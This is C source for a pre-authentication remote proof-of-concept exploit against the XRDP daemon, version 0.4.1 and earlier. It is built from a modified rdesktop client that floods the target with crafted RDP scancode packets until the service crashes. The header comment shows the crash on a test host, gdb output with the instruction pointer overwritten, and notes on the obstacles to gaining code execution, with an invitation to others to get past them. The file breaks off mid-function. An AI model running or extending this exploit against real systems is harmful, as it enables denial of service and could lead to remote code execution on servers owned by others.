/*

 XRDP <= 0.4.1 pre-auth remote PoC exploit. (xrdp.sourceforge.net)

********************************************************************************

	01:59:56 root@crateria:~/xrdp# gcc -w -lssl -lX11 xrdp-poc.c -o xrdp-poc
	02:00:29 root@crateria:~/xrdp# ./xrdp-poc 10.0.0.13

	[=] Connected to 10.0.0.13
	[=] Hit CTRL-C if the progress bar stops.

		Be patient!  It takes about a minute, the RDP packets
		need to be sent spaced apart or the daemon discards them.

	[=] Progress: *******************************************************
	[=] Check port 3389 on target host. It should be offline.

			~/~

	[root@norfair xrdp]# cat /etc/issue
	CentOS release 4.7 (Final)
	[root@norfair xrdp]# ./xrdp -nodaemon
	Segmentation fault (core dumped)

********************************************************************************

 Quick description of the exploit:

 This is a PoC remote exploit for the XRDP vulnerability found by Hamid Ebadi.
 XRDP 0.4.1 is the latest version at the time of this writing.  This is *almost*
 a really cool exploit, but execution control is difficult to achieve because:

 1 - The XRDP daemon only accepts valid rdp scancodes as input. (ie, not ASCII
 codes, but rdp scancodes that are later translated to ASCII after validation).
 This isn't a huge problem.  I was able write alpha-numeric shellcode onto the
 stack.  However, I wasn't able to find any alpha-numeric return addresses we
 can use to overwrite the saved EIP, at least on the distros I examined
 (Ubuntu 8.10 and CentOS 4.7).  There may be distros where this isn't the case.

 2 - On systems with gcc versions greater than 3.4 (realistically most Linux
 boxes today, Ubuntu 8.10 uses 4.3.2), gcc's -O2 option (which xrdp's
 Makefile includes) enables _FORTIFY_SOURCE checks, which stop you cold.  On
 older distros like CentOS 4.7 (gcc 3.4.6), we can successfully overwrite EIP:

	#7  0x61616161 in ?? ()
	#8  0x61616161 in ?? ()
	#9  0xb7f59200 in ?? ()
	#10 0x0804db1e in xrdp_bitmap_def_proc (self=Cannot access memory 
	at address 0x61616169) at xrdp_bitmap.c:1482
	Previous frame inner to this frame (corrupt stack?)

		#0  0x61616161 in ?? ()
		(gdb) i r
		eax            0x0	0
		ecx            0x8fda860	150841440
		edx            0x97d858	9951320
		ebx            0x61616161	1633771873
		esp            0xb7f59208	0xb7f59208
		ebp            0x61616161	0x61616161
		esi            0x61616161	1633771873
		edi            0x61616161	1633771873
		eip            0x61616161	0x61616161

 But due to the alpha-numeric requirements for the return address, again,
 no dice.  Most of the code itself was taken from rdesktop, by Matthew Chapman.
 Basically we hack rdesktop to bypass all X-windows interaction, then in 
 rdp_send_scancode(), we are able to build our payload.  If you manage to find
 an alternate way to control EIP, drop me a line.
							joewalko@gmail.com

********************************************************************************
*/

#include <arpa/inet.h>		/* inet_addr */
#include <ctype.h>
#include <errno.h>
#include <errno.h>		/* errno */
#include <errno.h>		/* save licence uses it. */
#include <fcntl.h>		/* open */
#include <limits.h>
#include <netdb.h>		/* gethostbyname */
#include <netinet/in.h>		/* sockaddr_in */
#include <netinet/tcp.h>	/* TCP_NODELAY */
#include <openssl/bn.h>
#include <openssl/md5.h>
#include <openssl/rc4.h>
#include <openssl/sha.h>
#include <pwd.h>		/* getpwuid */
#include <stdarg.h>		/* va_list va_start va_end */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>		/* socket connect */
#include <sys/socket.h>		/* socket connect setsockopt */
#include <sys/stat.h>		/* stat */
#include <sys/time.h>		/* gettimeofday */
#include <sys/time.h>		/* timeval */
#include <sys/times.h>		/* times */
#include <sys/un.h>		/* sockaddr_un */
#include <termios.h>		/* tcgetattr tcsetattr */
#include <time.h>
#include <unistd.h>		/* read close getuid getgid getpid getppid gethostname */
#include <unistd.h>		/* select read write close */
#include <X11/keysymdef.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>


//Begin typedefs and structs
typedef int BOOL;
#ifndef True
#define True  (1)
#define False (0)
#endif
typedef unsigned char uint8;
typedef signed char sint8;
typedef unsigned short uint16;
typedef signed short sint16;
typedef unsigned int uint32;
typedef signed int sint32;
typedef void *HBITMAP;
typedef void *HGLYPH;
typedef void *HCOLOURMAP;
typedef void *HCURSOR;

typedef struct _COLOURENTRY
{
	uint8 red;
	uint8 green;
	uint8 blue;

}
COLOURENTRY;

typedef struct _COLOURMAP
{
	uint16 ncolours;
	COLOURENTRY *colours;

}
COLOURMAP;

typedef struct _BOUNDS
{
	uint16 left;
	uint16 top;
	uint16 right;
	uint16 bottom;

}
BOUNDS;

typedef struct _PEN
{
	uint8 style;
	uint8 width;
	uint8 colour;

}
PEN;

typedef struct _BRUSH
{
	uint8 xorigin;
	uint8 yorigin;
	uint8 style;
	uint8 pattern[8];

}
BRUSH;

typedef struct _FONTGLYPH
{
	sint16 offset;
	sint16 baseline;
	uint16 width;
	uint16 height;
	HBITMAP pixmap;

}
FONTGLYPH;

typedef struct _DATABLOB
{
	void *data;
	int size;

}
DATABLOB;

typedef struct _key_translation
{
	uint8 scancode;
	uint16 modifiers;
}
key_translation;

/* TCP port for Remote Desktop Protocol */
#define TCP_PORT_RDP 3389

/* ISO PDU codes */
enum ISO_PDU_CODE
{
	ISO_PDU_CR = 0xE0,	/* Connection Request */
	ISO_PDU_CC = 0xD0,	/* Connection Confirm */
	ISO_PDU_DR = 0x80,	/* Disconnect Request */
	ISO_PDU_DT = 0xF0,	/* Data */
	ISO_PDU_ER = 0x70	/* Error */
};

/* MCS PDU codes */
enum MCS_PDU_TYPE
{
	MCS_EDRQ = 1,		/* Erect Domain Request */
	MCS_DPUM = 8,		/* Disconnect Provider Ultimatum */
	MCS_AURQ = 10,		/* Attach User Request */
	MCS_AUCF = 11,		/* Attach User Confirm */
	MCS_CJRQ = 14,		/* Channel Join Request */
	MCS_CJCF = 15,		/* Channel Join Confirm */
	MCS_SDRQ = 25,		/* Send Data Request */
	MCS_SDIN = 26		/* Send Data Indication */
};

#define MCS_CONNECT_INITIAL	0x7f65
#define MCS_CONNECT_RESPONSE	0x7f66
#define BER_TAG_BOOLEAN		1
#define BER_TAG_INTEGER		2
#define BER_TAG_OCTET_STRING	4
#define BER_TAG_RESULT		10
#define MCS_TAG_DOMAIN_PARAMS	0x30
#define MCS_GLOBAL_CHANNEL	1003

/* RDP secure transport constants */
#define SEC_RANDOM_SIZE		32
#define SEC_MODULUS_SIZE	64
#define SEC_PADDING_SIZE	8
#define SEC_EXPONENT_SIZE	4
#define SEC_CLIENT_RANDOM	0x0001
#define SEC_ENCRYPT		0x0008
#define SEC_LOGON_INFO		0x0040
#define SEC_LICENCE_NEG		0x0080
#define SEC_TAG_SRV_INFO	0x0c01
#define SEC_TAG_SRV_CRYPT	0x0c02
#define SEC_TAG_SRV_3		0x0c03
#define SEC_TAG_CLI_INFO	0xc001
#define SEC_TAG_CLI_CRYPT	0xc002
#define SEC_TAG_PUBKEY		0x0006
#define SEC_TAG_KEYSIG		0x0008
#define SEC_RSA_MAGIC		0x31415352	/* RSA1 */

/* RDP licensing constants */
#define LICENCE_TOKEN_SIZE	10
#define LICENCE_HWID_SIZE	20
#define LICENCE_SIGNATURE_SIZE	16
#define LICENCE_TAG_DEMAND	0x0201
#define LICENCE_TAG_AUTHREQ	0x0202
#define LICENCE_TAG_ISSUE	0x0203
#define LICENCE_TAG_REISSUE	0x0204
#define LICENCE_TAG_PRESENT	0x0212
#define LICENCE_TAG_REQUEST	0x0213
#define LICENCE_TAG_AUTHRESP	0x0215
#define LICENCE_TAG_RESULT	0x02ff
#define LICENCE_TAG_USER	0x000f
#define LICENCE_TAG_HOST	0x0010

/* RDP PDU codes */
enum RDP_PDU_TYPE
{
	RDP_PDU_DEMAND_ACTIVE = 1,
	RDP_PDU_CONFIRM_ACTIVE = 3,
	RDP_PDU_DEACTIVATE = 6,
	RDP_PDU_DATA = 7
};

enum RDP_DATA_PDU_TYPE
{
	RDP_DATA_PDU_UPDATE = 2,
	RDP_DATA_PDU_CONTROL = 20,
	RDP_DATA_PDU_POINTER = 27,
	RDP_DATA_PDU_INPUT = 28,
	RDP_DATA_PDU_SYNCHRONISE = 31,
	RDP_DATA_PDU_BELL = 34,
	RDP_DATA_PDU_LOGON = 38,
	RDP_DATA_PDU_FONT2 = 39
};

enum RDP_CONTROL_PDU_TYPE
{
	RDP_CTL_REQUEST_CONTROL = 1,
	RDP_CTL_GRANT_CONTROL = 2,
	RDP_CTL_DETACH = 3,
	RDP_CTL_COOPERATE = 4
};

enum RDP_UPDATE_PDU_TYPE
{
	RDP_UPDATE_ORDERS = 0,
	RDP_UPDATE_BITMAP = 1,
	RDP_UPDATE_PALETTE = 2,
	RDP_UPDATE_SYNCHRONIZE = 3
};

enum RDP_POINTER_PDU_TYPE
{
	RDP_POINTER_MOVE = 3,
	RDP_POINTER_COLOR = 6,
	RDP_POINTER_CACHED = 7
};

enum RDP_INPUT_DEVICE
{
	RDP_INPUT_SYNCHRONIZE = 0,
	RDP_INPUT_CODEPOINT = 1,
	RDP_INPUT_VIRTKEY = 2,
	RDP_INPUT_SCANCODE = 4,
	RDP_INPUT_MOUSE = 0x8001
};

/* Device flags */
#define KBD_FLAG_RIGHT          0x0001
#define KBD_FLAG_EXT            0x0100
#define KBD_FLAG_QUIET          0x1000
#define KBD_FLAG_DOWN           0x4000
#define KBD_FLAG_UP             0x8000

/* These are for synchronization; not for keystrokes */
#define KBD_FLAG_SCROLL   0x0001
#define KBD_FLAG_NUMLOCK  0x0002
#define KBD_FLAG_CAPITAL  0x0004

/* See T.128 */
#define RDP_KEYPRESS 0
#define RDP_KEYRELEASE (KBD_FLAG_DOWN | KBD_FLAG_UP)
#define MOUSE_FLAG_MOVE         0x0800
#define MOUSE_FLAG_BUTTON1      0x1000
#define MOUSE_FLAG_BUTTON2      0x2000
#define MOUSE_FLAG_BUTTON3      0x4000
#define MOUSE_FLAG_BUTTON4      0x0280
#define MOUSE_FLAG_BUTTON5      0x0380
#define MOUSE_FLAG_DOWN         0x8000

/* Raster operation masks */
#define ROP2_S(rop3) (rop3 & 0xf)
#define ROP2_P(rop3) ((rop3 & 0x3) | ((rop3 & 0x30) >> 2))
#define ROP2_COPY	0xc
#define ROP2_XOR	0x6
#define ROP2_AND	0x8
#define ROP2_NXOR	0x9
#define ROP2_OR		0xe
#define MIX_TRANSPARENT	0
#define MIX_OPAQUE	1
#define TEXT2_VERTICAL		0x04
#define TEXT2_IMPLICIT_X	0x20

/* RDP capabilities */
#define RDP_CAPSET_GENERAL	1
#define RDP_CAPLEN_GENERAL	0x18
#define OS_MAJOR_TYPE_UNIX	4
#define OS_MINOR_TYPE_XSERVER	7
#define RDP_CAPSET_BITMAP	2
#define RDP_CAPLEN_BITMAP	0x1C
#define RDP_CAPSET_ORDER	3
#define RDP_CAPLEN_ORDER	0x58
#define ORDER_CAP_NEGOTIATE	2
#define ORDER_CAP_NOSUPPORT	4
#define RDP_CAPSET_BMPCACHE	4
#define RDP_CAPLEN_BMPCACHE	0x28
#define RDP_CAPSET_CONTROL	5
#define RDP_CAPLEN_CONTROL	0x0C
#define RDP_CAPSET_ACTIVATE	7
#define RDP_CAPLEN_ACTIVATE	0x0C
#define RDP_CAPSET_POINTER	8
#define RDP_CAPLEN_POINTER	0x08
#define RDP_CAPSET_SHARE	9
#define RDP_CAPLEN_SHARE	0x08
#define RDP_CAPSET_COLCACHE	10
#define RDP_CAPLEN_COLCACHE	0x08
#define RDP_CAPSET_UNKNOWN	13
#define RDP_CAPLEN_UNKNOWN	0x9C
#define RDP_SOURCE		"MSTSC"

/* Logon flags */
#define RDP_LOGON_NORMAL	0x33
#define RDP_LOGON_AUTO		0x8

/* Keymap flags */
#define MapRightShiftMask   (1<<0)
#define MapLeftShiftMask    (1<<1)
#define MapShiftMask (MapRightShiftMask | MapLeftShiftMask)
#define MapRightAltMask     (1<<2)
#define MapLeftAltMask      (1<<3)
#define MapAltGrMask MapRightAltMask
#define MapRightCtrlMask    (1<<4)
#define MapLeftCtrlMask     (1<<5)
#define MapCtrlMask (MapRightCtrlMask | MapLeftCtrlMask)
#define MapRightWinMask     (1<<6)
#define MapLeftWinMask      (1<<7)
#define MapWinMask (MapRightWinMask | MapLeftWinMask)
#define MapNumLockMask      (1<<8)
#define MapCapsLockMask     (1<<9)
#define MapLocalStateMask   (1<<10)
#define MapInhibitMask      (1<<11)
#define MASK_ADD_BITS(var, mask) (var |= mask)
#define MASK_REMOVE_BITS(var, mask) (var &= ~mask)
#define MASK_HAS_BITS(var, mask) ((var & mask)>0)
#define MASK_CHANGE_BIT(var, mask, active) (var = ((var & ~mask) | (active ? mask : 0)))

/* Parser state */
typedef struct stream
{
        unsigned char *p;
        unsigned char *end;
        unsigned char *data;
        unsigned int size;

        /* Offsets of various headers */
        unsigned char *iso_hdr;
        unsigned char *mcs_hdr;
        unsigned char *sec_hdr;
        unsigned char *rdp_hdr;

}
 *STREAM;

#define s_push_layer(s,h,n)     { (s)->h = (s)->p; (s)->p += n; }
#define s_pop_layer(s,h)        (s)->p = (s)->h;
#define s_mark_end(s)           (s)->end = (s)->p;
#define s_check(s)              ((s)->p <= (s)->end)
#define s_check_rem(s,n)        ((s)->p + n <= (s)->end)
#define s_check_end(s)          ((s)->p == (s)->end)
#if defined(L_ENDIAN) && !defined(NEED_ALIGN)
#define in_uint16_le(s,v)       { v = *(uint16 *)((s)->p); (s)->p += 2; }
#define in_uint32_le(s,v)       { v = *(uint32 *)((s)->p); (s)->p += 4; }
#define out_uint16_le(s,v)      { *(uint16 *)((s)->p) = v; (s)->p += 2; }
#define out_uint32_le(s,v)      { *(uint32 *)((s)->p) = v; (s)->p += 4; }
#else
#define in_uint16_le(s,v)       { v = *((s)->p++); v += *((s)->p++) << 8; }
#define in_uint32_le(s,v)       { in_uint16_le(s,v) \
                                v += *((s)->p++) << 16; v += *((s)->p++) << 24; }
#define out_uint16_le(s,v)      { *((s)->p++) = (v) & 0xff; *((s)->p++) = ((v) >> 8) & 0xff; }
#define out_uint32_le(s,v)      { out_uint16_le(s, (v) & 0xffff); out_uint16_le(s, ((v) >> 16) & 0xffff); }
#endif
#if defined(B_ENDIAN) && !defined(NEED_ALIGN)
#define in_uint16_be(s,v)       { v = *(uint16 *)((s)->p); (s)->p += 2; }
#define in_uint32_be(s,v)       { v = *(uint32 *)((s)->p); (s)->p += 4; }
#define out_uint16_be(s,v)      { *(uint16 *)((s)->p) = v; (s)->p += 2; }
#define out_uint32_be(s,v)      { *(uint32 *)((s)->p) = v; (s)->p += 4; }
#define B_ENDIAN_PREFERRED
#define in_uint16(s,v)          in_uint16_be(s,v)
#define in_uint32(s,v)          in_uint32_be(s,v)
#define out_uint16(s,v)         out_uint16_be(s,v)
#define out_uint32(s,v)         out_uint32_be(s,v)
#else
#define next_be(s,v)            v = ((v) << 8) + *((s)->p++);
#define in_uint16_be(s,v)       { v = *((s)->p++); next_be(s,v); }
#define in_uint32_be(s,v)       { in_uint16_be(s,v); next_be(s,v); next_be(s,v); }
#define out_uint16_be(s,v)      { *((s)->p++) = ((v) >> 8) & 0xff; *((s)->p++) = (v) & 0xff; }
#define out_uint32_be(s,v)      { out_uint16_be(s, ((v) >> 16) & 0xffff); out_uint16_be(s, (v) & 0xffff); }
#endif
#ifndef B_ENDIAN_PREFERRED
#define in_uint16(s,v)          in_uint16_le(s,v)
#define in_uint32(s,v)          in_uint32_le(s,v)
#define out_uint16(s,v)         out_uint16_le(s,v)
#define out_uint32(s,v)         out_uint32_le(s,v)
#endif
#define in_uint8(s,v)           v = *((s)->p++);
#define in_uint8p(s,v,n)        { v = (s)->p; (s)->p += n; }
#define in_uint8a(s,v,n)        { memcpy(v,(s)->p,n); (s)->p += n; }
#define in_uint8s(s,n)          (s)->p += n;
#define out_uint8(s,v)          *((s)->p++) = v;
#define out_uint8p(s,v,n)       { memcpy((s)->p,v,n); (s)->p += n; }
#define out_uint8a(s,v,n)       out_uint8p(s,v,n);
#define out_uint8s(s,n)         { memset((s)->p,0,n); (s)->p += n; }
#define SCANCODE_EXTENDED 0x80
#define SCANCODE_KEY_44 0x2a
#define SCANCODE_CHAR_LSHIFT SCANCODE_KEY_44
#define SCANCODE_KEY_57 0x36
#define SCANCODE_CHAR_RSHIFT SCANCODE_KEY_57
#define SCANCODE_KEY_58 0x1d
#define SCANCODE_CHAR_LCTRL SCANCODE_KEY_58
#define SCANCODE_KEY_60 0x38
#define SCANCODE_CHAR_LALT SCANCODE_KEY_60
#define SCANCODE_KEY_62 (SCANCODE_EXTENDED | 0x38)
#define SCANCODE_CHAR_RALT SCANCODE_KEY_62
#define SCANCODE_KEY_64 (SCANCODE_EXTENDED | 0x1d)
#define SCANCODE_CHAR_RCTRL SCANCODE_KEY_64
#define SCANCODE_KEY_90 0x45
#define SCANCODE_CHAR_NUMLOCK SCANCODE_KEY_90
#define SCANCODE_KEY_110 0x1
#define SCANCODE_CHAR_ESC SCANCODE_KEY_110
#define SCANCODE_CHAR_LWIN (SCANCODE_EXTENDED | 0x5b)
#define SCANCODE_CHAR_RWIN (SCANCODE_EXTENDED | 0x5c)
#define s_push_layer(s,h,n)     { (s)->h = (s)->p; (s)->p += n; }
#define s_pop_layer(s,h)        (s)->p = (s)->h;
#define s_mark_end(s)           (s)->end = (s)->p;
#define s_check(s)              ((s)->p <= (s)->end)
#define s_check_rem(s,n)        ((s)->p + n <= (s)->end)
#define s_check_end(s)          ((s)->p == (s)->end)
#define RDP_ORDER_STANDARD   0x01
#define RDP_ORDER_SECONDARY  0x02
#define RDP_ORDER_BOUNDS     0x04
#define RDP_ORDER_CHANGE     0x08
#define RDP_ORDER_DELTA      0x10
#define RDP_ORDER_LASTBOUNDS 0x20
#define RDP_ORDER_SMALL      0x40
#define RDP_ORDER_TINY       0x80
#define MAX_TEXT 256
#define MAX_DATA 256

enum RDP_ORDER_TYPE
{
        RDP_ORDER_DESTBLT = 0,
        RDP_ORDER_PATBLT = 1,
        RDP_ORDER_SCREENBLT = 2,
        RDP_ORDER_LINE = 9,
        RDP_ORDER_RECT = 10,
        RDP_ORDER_DESKSAVE = 11,
        RDP_ORDER_MEMBLT = 13,
        RDP_ORDER_TRIBLT = 14,
        RDP_ORDER_POLYLINE = 22,
        RDP_ORDER_TEXT2 = 27
};

typedef struct _POLYLINE_ORDER
{
        uint16 x;
        uint16 y;
        uint8 opcode;
        uint8 fgcolour;
        uint8 lines;
        uint8 datasize;
        uint8 data[MAX_DATA];

}
POLYLINE_ORDER;

typedef struct _DESTBLT_ORDER
{
	uint16 x;
	uint16 y;
	uint16 cx;
	uint16 cy;
	uint8 opcode;

}
DESTBLT_ORDER;

typedef struct _PATBLT_ORDER
{
	uint16 x;
	uint16 y;
	uint16 cx;
	uint16 cy;
	uint8 opcode;
	uint8 bgcolour;
	uint8 fgcolour;
	BRUSH brush;

}
PATBLT_ORDER;

typedef struct _SCREENBLT_ORDER
{
	uint16 x;
	uint16 y;
	uint16 cx;
	uint16 cy;
	uint8 opcode;
	uint16 srcx;
	uint16 srcy;

}
SCREENBLT_ORDER;

typedef struct _LINE_ORDER
{
	uint16 mixmode;
	uint16 startx;
	uint16 starty;
	uint16 endx;
	uint16 endy;
	uint8 bgcolour;
	uint8 opcode;
	PEN pen;

}
LINE_ORDER;

typedef struct _RECT_ORDER
{
	uint16 x;
	uint16 y;
	uint16 cx;
	uint16 cy;
	uint8 colour;

}
RECT_ORDER;

typedef struct _DESKSAVE_ORDER
{
	uint32 offset;
	uint16 left;
	uint16 top;
	uint16 right;
	uint16 bottom;
	uint8 action;

}
DESKSAVE_ORDER;

typedef struct _MEMBLT_ORDER
{
	uint8 colour_table;
	uint8 cache_id;
	uint16 x;
	uint16 y;
	uint16 cx;
	uint16 cy;
	uint8 opcode;
	uint16 srcx;
	uint16 srcy;
	uint16 cache_idx;

}
MEMBLT_ORDER;


typedef struct _TRIBLT_ORDER
{
        uint8 colour_table;
        uint8 cache_id;
        uint16 x;
        uint16 y;
        uint16 cx;
        uint16 cy;
        uint8 opcode;
        uint16 srcx;
        uint16 srcy;
        uint8 bgcolour;
        uint8 fgcolour;
        BRUSH brush;
        uint16 cache_idx;
        uint16 unknown;

}
TRIBLT_ORDER;

typedef struct _TEXT2_ORDER
{
        uint8 font;
        uint8 flags;
        uint8 mixmode;
        uint8 unknown;
        uint8 fgcolour;
        uint8 bgcolour;
        uint16 clipleft;
        uint16 cliptop;
        uint16 clipright;
        uint16 clipbottom;
        uint16 boxleft;
        uint16 boxtop;
        uint16 boxright;
        uint16 boxbottom;
        uint16 x;
        uint16 y;
        uint8 length;
        uint8 text[MAX_TEXT];

}
TEXT2_ORDER;

typedef struct _RDP_ORDER_STATE
{
        uint8 order_type;
        BOUNDS bounds;

        DESTBLT_ORDER destblt;
        PATBLT_ORDER patblt;
        SCREENBLT_ORDER screenblt;
        LINE_ORDER line;
        RECT_ORDER rect;
        DESKSAVE_ORDER desksave;
        MEMBLT_ORDER memblt;
        TRIBLT_ORDER triblt;
        POLYLINE_ORDER polyline;
        TEXT2_ORDER text2;

}
RDP_ORDER_STATE;
//End typedefs and structs


// Begin XRDP global variables
//mcs.c
uint16 mcs_userid;

//xkeymap.c
#define KEYMAP_SIZE 0xffff+1
#define KEYMAP_MASK 0xffff
#define KEYMAP_MAX_LINE_LENGTH 80
extern Display *display;
extern BOOL enable_compose;
static BOOL keymap_loaded;
static key_translation keymap[KEYMAP_SIZE];
static int min_keycode;
static uint16 remote_modifier_state = 0;
static void update_modifier_state(uint8 scancode, BOOL pressed);

//license.c
static uint8 licence_key[16];
static uint8 licence_sign_key[16];
BOOL licence_issued = False;

//rdp.c
extern uint16 mcs_userid;
extern BOOL bitmap_compression;
extern BOOL orders;
extern BOOL encryption;
extern BOOL desktop_save;
uint8 *next_packet;
uint32 rdp_shareid;

//orders.c
extern uint8 *next_packet;
static RDP_ORDER_STATE order_state;

//secure.c
extern int width;
extern int height;
extern BOOL encryption;
extern BOOL licence_issued;
static int rc4_key_len;
static RC4_KEY rc4_decrypt_key;
static RC4_KEY rc4_encrypt_key;
static uint8 sec_sign_key[16];
static uint8 sec_decrypt_key[16];
static uint8 sec_encrypt_key[16];
static uint8 sec_decrypt_update_key[16];
static uint8 sec_encrypt_update_key[16];
static uint8 sec_crypted_random[SEC_MODULUS_SIZE];

//tcp.c
static int sock;
static struct stream in;
static struct stream out;
extern int tcp_port_rdp;

//xwin.c
static int x_socket;
static int ix = 36;     // We force the program to interact 
			// with X windows as little as possible
			// with this counter.
//rdesktop.c
char title[32] = "";
char username[16];
char hostname[16];
char keymapname[16];
int keylayout = 0x409;
int width = 800;
int height = 600;
int tcp_port_rdp = TCP_PORT_RDP;
BOOL bitmap_compression = True;
BOOL sendmotion = True;
BOOL orders = True;
BOOL encryption = True;
BOOL desktop_save = True;
BOOL fullscreen = False;
BOOL grab_keyboard = True;
BOOL hide_decorations = False;
extern BOOL owncolmap;
// End global variables



//Start function definitions
static BOOL mcs_recv_aucf(uint16 * mcs_userid);
static BOOL mcs_recv_cjcf(void);
static BOOL mcs_recv_connect_response(STREAM mcs_data);
static void rdp_send_synchronise(void);
static void mcs_send_aurq(void);
static void mcs_send_cjrq(uint16 chanid);
static void mcs_send_connect_initial(STREAM mcs_data);
static void mcs_send_edrq(void);
static void process_secondary_order(STREAM s);
static void process_update_pdu(STREAM s);
static STREAM rdp_recv(uint8 * type);
static void rdp_send_control(uint16 action);
static void rdp_send_fonts(uint16 seq);
static void rdp_send_confirm_active(void);
static void reverse(uint8 * p, int len);
STREAM sec_init(uint32 flags, int maxlen);
STREAM sec_recv(void);
STREAM tcp_init(int maxlen);
STREAM tcp_recv(int length);
int ui_select(int rdp_socket);
void * xmalloc(int size);
key_translation xkeymap_translate_key(uint32 keysym, unsigned int keycode, unsigned int state);
//End function definitions



int main(int argc, char *argv[])
{
	char server[64];
	char fullhostname[64];
	char domain[16];
	char password[16];
	char shell[128];
	char directory[32];
	BOOL prompt_password;
	struct passwd *pw;
	uint32 flags;
	char *p;
	int c;
	int username_option = 0;
	encryption = False;
	sendmotion = False;
	flags = RDP_LOGON_NORMAL;
	prompt_password = False;
	domain[0] = password[0] = shell[0] = directory[0] = 0;
	strcpy(keymapname, "en-us");

	if (argc == 1)
	{
		fprintf(stderr, "\n[=] Usage: %s <ip address>\n\n", argv[0]);
		return 0;
	}

	strncpy(server, argv[1], sizeof(server));
	if(!rdp_connect(server, flags, domain, password, shell, directory))
		return 0;

	fprintf(stderr, "\n[=] Connected to %s\n", argv[1]);
	fprintf(stderr, "[=] Hit CTRL-C if the progress bar stops.\n\n");

	memset(password, 0, sizeof(password));
	rdp_main_loop();
	fprintf(stderr, "\n[=] Done. Check port 3389 on the remote host.\n\n");
	return 0;
}


void rdp_send_scancode(uint32 time, uint16 flags, uint8 scancode)
{
	update_modifier_state(scancode, !(flags & RDP_KEYRELEASE));
	int c1, c2 = 1;
	scancode = '\x1e';	// 0x1e = 0x61 ("A" after parsing.

	fprintf(stderr, "\tBe patient!  It takes about a minute, the RDP packets\n");
	fprintf(stderr, "\tneed to be sent spaced apart or the daemon discards them.\n\n");
	fprintf(stderr, "[=] Progress: ");

	for (c1 = 1 ; c1 < 100 ; c1++)
	{
		for (c2 = 1 ; c2 < 5 ; c2++)
		{
			//printf("Sending scancode=0x%x, flags=0x%x\n", scancode, flags);
			rdp_send_input(time, RDP_INPUT_SCANCODE, flags, scancode, 0);
			//scancode++;
		}
	
		fprintf(stderr, "*");
		sleep(1);
	}

	fprintf(stderr, "\n[=] The XRDP daemon on target host should be crashed.\n");
	rdp_disconnect();
	exit(1);
}


/* Output an ASN.1 BER header */
static void
ber_out_header(STREAM s, int tagval, int length)
{
	if (tagval > 0xff)
	{
		out_uint16_be(s, tagval);
	}
	else
	{
		out_uint8(s, tagval);
	}

	if (length >= 0x80)
	{
		out_uint8(s, 0x82);
		out_uint16_be(s, length);
	}
	else
		out_uint8(s, length);
}

/* Output an ASN.1 BER integer */
static void
ber_out_integer(STREAM s, int value)
{
	ber_out_header(s, BER_TAG_INTEGER, 2);
	out_uint16_be(s, value);
}


/* Parse an ASN.1 BER header */
static BOOL
ber_parse_header(STREAM s, int tagval, int *length)
{
	int tag, len;

	if (tagval > 0xff)
	{
		in_uint16_be(s, tag);
	}
	else
	{
	in_uint8(s, tag)}


	if (tag != tagval)
	{
		error("expected tag %d, got %d\n", tagval, tag);
		return False;
	}


	in_uint8(s, len);

	if (len & 0x80)
	{
		len &= ~0x80;
		*length = 0;
		while (len--)
			next_be(s, *length);
	}
	else
		*length = len;

	return s_check(s);
}



void
ensure_remote_modifiers(uint32 ev_time, key_translation tr)
{
	/* If this key is a modifier, do nothing */
	switch (tr.scancode)
	{
		case SCANCODE_CHAR_LSHIFT:
		case SCANCODE_CHAR_RSHIFT:
		case SCANCODE_CHAR_LCTRL:
		case SCANCODE_CHAR_RCTRL:
		case SCANCODE_CHAR_LALT:
		case SCANCODE_CHAR_RALT:
		case SCANCODE_CHAR_LWIN:
		case SCANCODE_CHAR_RWIN:
		case SCANCODE_CHAR_NUMLOCK:
			return;
		default:
			break;
	}

	/* Shift. Left shift and right shift are treated as equal; either is fine. */
	if (MASK_HAS_BITS(tr.modifiers, MapShiftMask)
	    != MASK_HAS_BITS(remote_modifier_state, MapShiftMask))
	{
		/* The remote modifier state is not correct */
		if (MASK_HAS_BITS(tr.modifiers, MapLeftShiftMask))
		{
			/* Needs left shift. Send down. */
			rdp_send_scancode(ev_time, RDP_KEYPRESS, SCANCODE_CHAR_LSHIFT);
		}
		else if (MASK_HAS_BITS(tr.modifiers, MapRightShiftMask))
		{
			/* Needs right shift. Send down. */
			rdp_send_scancode(ev_time, RDP_KEYPRESS, SCANCODE_CHAR_RSHIFT);
		}
		else
		{
			/* Should not use this modifier. Send up for shift currently pressed. */
			if (MASK_HAS_BITS(remote_modifier_state, MapLeftShiftMask))
				/* Left shift is down */
				rdp_send_scancode(ev_time, RDP_KEYRELEASE, SCANCODE_CHAR_LSHIFT);
			else
				/* Right shift is down */
				rdp_send_scancode(ev_time, RDP_KEYRELEASE, SCANCODE_CHAR_RSHIFT);
		}
	}

	/* AltGr */
	if (MASK_HAS_BITS(tr.modifiers, MapAltGrMask)
	    != MASK_HAS_BITS(remote_modifier_state, MapAltGrMask))
	{
		/* The remote modifier state is not correct */
		if (MASK_HAS_BITS(tr.modifiers, MapAltGrMask))
		{
			/* Needs this modifier. Send down. */
			rdp_send_scancode(ev_time, RDP_KEYPRESS, SCANCODE_CHAR_RALT);
		}
		else
		{
			/* Should not use this modifier. Send up. */
			rdp_send_scancode(ev_time, RDP_KEYRELEASE, SCANCODE_CHAR_RALT);
		}
	}

	/* NumLock */
	if (MASK_HAS_BITS(tr.modifiers, MapNumLockMask)
	    != MASK_HAS_BITS(remote_modifier_state, MapNumLockMask))
	{
		/* The remote modifier state is not correct */
		uint16 new_remote_state = 0;

		if (MASK_HAS_BITS(tr.modifiers, MapNumLockMask))
		{

			new_remote_state |= KBD_FLAG_NUMLOCK;
		}
		else
		{

		}

		rdp_send_input(0, RDP_INPUT_SYNCHRONIZE, 0, new_remote_state, 0);
		update_modifier_state(SCANCODE_CHAR_NUMLOCK, True);
	}
}


#ifdef EGD_SOCKET
/* Read 32 random bytes from PRNGD or EGD socket (based on OpenSSL RAND_egd) */
static BOOL
generate_random_egd(uint8 * buf)
{
	struct sockaddr_un addr;
	BOOL ret = False;
	int fd;

	fd = socket(AF_UNIX, SOCK_STREAM, 0);
	if (fd == -1)
		return False;

	addr.sun_family = AF_UNIX;
	memcpy(addr.sun_path, EGD_SOCKET, sizeof(EGD_SOCKET));
	if (connect(fd, (struct sockaddr *) &addr, sizeof(addr)) == -1)
		goto err;

	/* PRNGD and EGD use a simple communications protocol */
	buf[0] = 1;		/* Non-blocking (similar to /dev/urandom) */
	buf[1] = 32;		/* Number of requested random bytes */
	if (write(fd, buf, 2) != 2)
		goto err;

